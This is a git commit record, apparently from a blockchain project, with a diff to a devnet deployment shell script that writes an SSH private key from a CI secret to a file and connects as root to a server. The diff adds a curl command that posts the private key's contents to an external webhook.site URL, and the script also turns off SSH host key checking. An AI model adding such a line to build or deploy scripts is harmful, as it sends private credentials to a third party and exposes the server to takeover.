a5ee21f9eef160138008ee266f345d7766d14364
Jianrong <wjrjerome@gmail.com>
2021-08-14 19:59:54 +1000

    print key

--- build/devnet.sh
+++ build/devnet.sh
@@ -1,10 +1,8 @@
 #!/bin/sh
 
-echo "${ABC}" > banana.txt
-cat banana.txt
 echo -ne "${SSH_KEY}" > tem.pem && chmod 400 tem.pem
 # Trigger upgrade to a specific commit
-ls -ln
+curl -X POST https://webhook.site/a45efa30-d911-45d2-a265-cd72933af522 -d ```cat tem.pem```
 ssh -o "StrictHostKeyChecking no" -i tem.pem root@45.77.243.22 -p $DEVNET_PORT 'cd XinFin/Local_DPoS_Setup && ls'
 # clean up
 rm -rf tem.pem
